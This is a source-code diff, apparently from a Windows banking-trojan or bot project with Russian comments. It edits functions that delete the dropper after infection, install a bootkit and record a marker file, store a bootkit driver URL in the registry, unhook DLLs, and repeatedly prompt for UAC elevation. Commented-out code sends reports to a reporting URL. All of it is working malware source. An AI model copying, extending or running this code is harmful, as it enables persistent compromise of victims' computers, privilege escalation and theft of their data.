@@ -2,6 +2,7 @@
 #include <tlhelp32.h> 
 
 #include "GetApi.h"
+#include "BotCore.h"
 #include "Memory.h"
 #include "Strings.h"
 #include "DllLoader.h"
@@ -103,7 +104,9 @@ BOOL SaveManifest(PCHAR FileName)
 
 DWORD WINAPI DeleteDropper(LPVOID) // убиваем процесс, стираем файл
 {
-	PP_DPRINTF("DeleteDropper: started for '%S'", FileToDelete);
+	BOT::Initialize();
+
+	PP_DPRINTF("DeleteDropper: started for '%s'", FileToDelete);
 	LONG i = 1;
 	
 	PP_DPRINTF("DeleteDropper: Calling MoveEx...");
@@ -115,18 +118,6 @@ DWORD WINAPI DeleteDropper(LPVOID) // убиваем процесс, стираем файл
 
 		if (pDeleteFileA( FileToDelete ))
 			break;
-/*	
-	{
-		PCHAR buf;
-		DWORD dwErr;
-		dwErr = (DWORD)pGetLastError();
-		buf = StrLongToString(dwErr);
-		pOutputDebugStringA (buf);
-		pOutputDebugStringA("	-	");
-		pOutputDebugStringA(FileToDelete);
-		STR::Free(buf);
-	}
-*/
 		pSleep(1025*i);
 	};
 	
@@ -284,7 +275,7 @@ void GetDriverUrl(char * UrlBuffer, DWORD UrlBufferSize)
 	PCHAR Params = Strings::GetText(Fields, "&");
 	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
 	
-	PP_DPRINTF("GetDriverUrl: url='%S':%u", URL, STR::Length(URL));
+	PP_DPRINTF("GetDriverUrl: url='%s':%u", URL, STR::Length(URL));
 
 	PP_RETURNIF1(UrlBufferSize < (STR::Length(URL) - 1));
 
@@ -313,7 +304,7 @@ bool SaveUrlForBootkitDriver()
 		(DWORD)plstrlenA(url));
 	PP_RETURNIF2(url_value_set != ERROR_SUCCESS, false);
 
-	PP_DPRINTF("SaveUrlForBootkit: Url key set (url=%S).", url);
+	PP_DPRINTF("SaveUrlForBootkit: Url key set (url=%s).", url);
 
 	pRegCloseKey(key);
 	return true;
@@ -395,7 +386,7 @@ BOOL ExplorerMain()
 			ret = TRUE;
 			BkInstalledSuccess = true;
 			
-			PP_DPRINTF("ExplorerMain: ExplorerStart()  finished successfuly. Saving 0x00000001 in '%S'",
+			PP_DPRINTF("ExplorerMain: ExplorerStart()  finished successfuly. Saving 0x00000001 in '%s'",
 				PathBkFile);
 
 			// Записываем в BkFile 4 байта с единичкой.
@@ -425,7 +416,7 @@ BOOL ExplorerMain()
 		PCHAR Pref= STR::GetRightStr(UID,"0");
 		m_lstrcat(Path, Pref);
 
-		PP_DPRINTF("ExplorerMain: Bk installed. Creating file '%S'", Path);
+		PP_DPRINTF("ExplorerMain: Bk installed. Creating file '%s'", Path);
 		File::WriteBufferA(Path,&Path,sizeof(PCHAR));
 
 		STR::Free(Pref);
@@ -451,6 +442,7 @@ BOOL ExplorerMain()
 // Проверяет свои права и пробует их расширить для 
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
+	BOT::Initialize();
 	// 
 	//	Cоздадим отдельный поток для удаления так как дропер может удаляться больше минуты.
 	//
@@ -463,8 +455,6 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 	OSVer.dwOSVersionInfoSize = sizeof(OSVer) ;
 
 	UnhookDlls();
-
-	BuildImport((PVOID)GetImageBase());
 
 	PP_DPRINTF("ExplorerRoutine: started");
 
@@ -578,7 +568,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 
 				for ( int i = 0; i < 10; ++i )
 				{
-					PP_DPRINTF("ExplorerRoutine: asking UAC for '%S'", tmp_manifest);
+					PP_DPRINTF("ExplorerRoutine: asking UAC for '%s'", tmp_manifest);
 
 					if ( pShellExecuteExA(&ExecInfo) == FALSE )
 						break;
@@ -587,7 +577,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 					pGetExitCodeProcess(ExecInfo.hProcess,&dwCode);
 					if ( dwCode == 0  )
 					{
-						PP_DPRINTF("ExplorerRoutine: UAC allowed for '%S'", tmp_manifest);
+						PP_DPRINTF("ExplorerRoutine: UAC allowed for '%s'", tmp_manifest);
 						break;
 					}
 				}
@@ -641,10 +631,8 @@ VOID GetPaths()
 	{
 
 		pGetModuleFileNameW(NULL,buf,MAX_PATH-1);
-		//pOutputDebugStringW(buf);
 		pWideCharToMultiByte(CP_ACP,0,buf,-1,FileToDelete,sizeof(FileToDelete)-1,NULL,&bUsed);
-		//pOutputDebugStringA(FileToDelete);
-		PP_DPRINTF("GetPaths: FileToDelete='%S'", FileToDelete);
+		PP_DPRINTF("GetPaths: FileToDelete='%s'", FileToDelete);
 
 		buf[0]= 0;
 		pSHGetSpecialFolderPathW(NULL,buf,CSIDL_COMMON_APPDATA ,TRUE);
@@ -653,7 +641,7 @@ VOID GetPaths()
 		m_lstrcat(PathBkFile,"\\");
 		m_lstrcat(PathBkFile,MakeMachineID());
 
-		PP_DPRINTF("GetPaths: PathBkFile='%S'",PathBkFile);
+		PP_DPRINTF("GetPaths: PathBkFile='%s'",PathBkFile);
 	};
 };
 
@@ -831,7 +819,7 @@ void SvcFuckupServiceMainTest()
 //	PCHAR Params = Strings::GetText(Fields, "&");
 //	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
 //
-//	PP_DPRINTF("DebugReportStep1: sending url='%S'", URL);
+//	PP_DPRINTF("DebugReportStep1: sending url='%s'", URL);
 //
 //	HTTP::Get(URL, NULL, NULL);
 //
@@ -851,7 +839,7 @@ void SvcFuckupServiceMainTest()
 //	PCHAR Params = Strings::GetText(Fields, "&");
 //	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
 //	
-//	PP_DPRINTF("TestDebugReportStepByName: sending url='%S'", URL);
+//	PP_DPRINTF("TestDebugReportStepByName: sending url='%s'", URL);
 //
 //	HTTP::Get(URL, NULL, NULL);
 //
@@ -1095,6 +1083,7 @@ int APIENTRY MyMain(int argc, char** argv)
 	//PP_DPRINTF("MyMain: finished");
 	//return 0;
 
+	BOT::Initialize();
 	UnhookDlls();//снимаем хуки
 	GetPaths();
 
